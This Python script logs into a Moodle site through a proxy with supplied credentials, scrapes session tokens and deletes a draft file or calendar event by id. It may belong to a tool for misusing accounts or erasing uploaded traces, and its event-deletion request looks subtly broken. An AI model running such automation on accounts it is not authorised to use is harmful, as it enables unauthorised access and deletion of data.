import requests
from bs4 import BeautifulSoup as s
import urllib

ss = requests.Session()
header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0'}


def delet(user,passw,host,urrl,proxy):
	url = f'{host}/login/index.php'
	resp = ss.get(url, headers=header, proxies=proxy)
	soup = s(resp.text,'html.parser')
	ltoken = soup.find("input", attrs={"name": "logintoken"})
	
	prob = ''
	
	if ltoken:
		ltoken = ltoken['value']
	else:
		ltoken = ''
	
	payload = {
                "anchor": "",
                "logintoken": ltoken,
                "username": user,
                "password": passw,
                "rememberusername": 1,
            }
         
		
	resp2 = ss.post(url, data=payload, headers=header, proxies=proxy)
	if 'loginerrors' in resp2.text:
		return
	else:
		soup2 = s(resp2.text,'html.parser')
		userid = soup2.find('div',{'id':'nav-notification-popover-container'})['data-userid']
		log = 'melogee'
	
	delurl = f'{host}/user/edit.php?id='+str(userid)+'&returnto=profile'
	
	resp3 = ss.get(delurl, headers=header, proxies=proxy)
	soup3 = s(resp3.text,'html.parser')
	sesskey = soup3.find('input',attrs={'name':'sesskey'})['value']
	client_id = str(soup3.find('div',{'class':'filemanager'})['id']).replace('filemanager-','')
	spliturl = urrl.split('/')
	filename = urllib.parse.unquote(spliturl[-1])
	itemid = spliturl[-2]
		
	datadel = {'sesskey':sesskey,
		           'client_id':client_id,
		           'filepath':'/',
		           'itemid':itemid,
		           'filename':filename
		}
		
	if 'pluginfile.php' in urrl:
		delevent = f'{host}/lib/ajax/service.php?sesskey={sesskey}&info=core_calendar_delete_calendar_events'
		dataevent =[{"index":0,"methodname":"core_calendar_delete_calendar_events","args":{"events":[{"eventid":int(itemid),"repeat":False}]}}]
		response = ss.post(delevent, data=dataevent,headers=header, proxies=proxy)
		prob = 'borre'
		
	else:
		dellurl = f'{host}/repository/draftfiles_ajax.php?action=delete'
		response = ss.post(dellurl, data=datadel,headers=header, proxies=proxy)
		prob = 'borre'
	
	return prob,log	